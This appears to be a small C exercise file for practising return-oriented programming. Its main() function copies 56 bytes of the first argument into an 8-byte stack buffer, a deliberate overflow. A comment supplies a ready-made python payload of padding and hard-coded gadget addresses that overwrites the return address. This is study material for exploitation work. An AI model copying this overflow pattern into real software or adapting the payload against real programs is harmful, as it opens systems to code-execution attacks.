#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int rop;

unsigned long get_rdx()
{
	asm ("mov %rdx, %rax;");
}

// Argument : "$(python -c 'print "A"*16+"B"*8+"\x58\xd8\xa5\xf7\xff\x7f\x20\x20"+"\x2c\x10\x60\x20\x20\x20\x20\x20"+"\x6f\xca\xb1\xf7\xff\x7f\x20\x20"+"\xd8\x06\x40\x20\x20\x20\x20\x20"')"
int main(int argc,char **argv)
{
	rop=5;
	char buffer[8];
	memcpy(buffer,argv[1],56);
	memset(buffer+30,0,2);
	memset(buffer+35,0,5);
	memset(buffer+46,0,2);
	memset(buffer+51,0,5);
}

void test()
{
	asm ("mov %rax, %rdx;");
	printf("rax is %#lx\n",get_rdx());
	exit(0);
}
